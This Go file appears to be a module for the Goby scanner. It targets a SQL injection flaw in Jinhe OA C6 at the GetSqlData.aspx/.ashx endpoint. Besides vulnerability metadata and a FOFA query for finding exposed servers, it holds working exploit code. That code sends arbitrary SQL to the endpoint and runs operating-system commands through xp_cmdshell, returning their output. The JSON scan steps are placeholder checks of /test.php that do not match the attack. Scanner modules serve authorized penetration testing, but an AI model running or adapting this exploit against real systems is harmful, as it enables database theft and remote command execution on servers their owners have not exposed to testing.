package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA C6/Control/GetSqlData.aspx/.ashx file SQL injection vulnerability",
    "Description": "<p>Jinhe Network is a professional information service provider. It provides Internet + supervision solutions for urban supervision departments, and provides services such as organizational collaboration OA system development platform, e-government integration platform, and smart e-commerce platform for enterprises and institutions.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2023-08-11",
    "PostTime": "2023-08-11",
    "Author": "1691834629@qq.com",
    "FofaQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || header=\"Path=/jc6\" || (body=\"JC6金和协同管理平台\" && body=\"src=\\\"/jc6/platform/\") || body=\"window.location = \\\"JHSoft.MobileApp/Default.htm\\\";\" || banner=\"Path=/jc6\"",
    "GobyQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || header=\"Path=/jc6\" || (body=\"JC6金和协同管理平台\" && body=\"src=\\\"/jc6/platform/\") || body=\"window.location = \\\"JHSoft.MobileApp/Default.htm\\\";\" || banner=\"Path=/jc6\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ipconfig",
            "show": "attackType=cmd"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "Command Execution"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "金和 OA C6/Control/GetSqlData.aspx/.ashx 文件 SQL 注入漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.jinher.com/\" target=\"_blank\">http://www.jinher.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Jinhe OA C6/Control/GetSqlData.aspx/.ashx file SQL injection vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe Network is a professional information service provider. It provides Internet + supervision solutions for urban supervision departments, and provides services such as organizational collaboration OA system development platform, e-government integration platform, and smart e-commerce platform for enterprises and institutions.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.jinher.com/\" target=\"_blank\">http://www.jinher.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	sendPayload102dosjqwb := func(hostInfo *httpclient.FixUrl, url, param string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(url)
		if param != "" {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.Data = param
		}
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload102dosjqwb(hostInfo, "/C6/Control/GetSqlData.aspx/.ashx", "select @@version")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "SQL")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				resp, err := sendPayload102dosjqwb(expResult.HostInfo, "/C6/Control/GetSqlData.aspx/.ashx", "exec master..xp_cmdshell '"+cmd+"'")
				if err != nil {
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				re := regexp.MustCompile(`(?s)<!\[CDATA\[(.*?)\]\]>`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				for _, match := range matches {
					if len(match) > 1 {
						expResult.Output += match[1]
					}
				}
				if len(expResult.Output) <= 0 {
					expResult.Success = false
				}
			} else if attackType == "sql" {
				sql := goutils.B2S(ss.Params["sql"])
				resp, err := sendPayload102dosjqwb(expResult.HostInfo, "/C6/Control/GetSqlData.aspx/.ashx", sql)
				if err != nil {
					expResult.Success = false
					return expResult
				}
				expResult.Success = resp.StatusCode == 200
				re := regexp.MustCompile(`(?s)<!\[CDATA\[(.*?)\]\]>`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				for _, match := range matches {
					if len(match) > 1 {
						expResult.Output += match[1]
					}
				}
			} else if attackType == "sqlPoint" {
				resp, err := sendPayload102dosjqwb(expResult.HostInfo, "/C6/Control/GetSqlData.aspx/.ashx", "select @@version")
				if err != nil {
					expResult.Success = false
					return expResult
				}
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "SQL"){
					expResult.Success = true
					expResult.Output = `
POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

select @@version`
				}
				
			}
			return expResult
		},
	))
}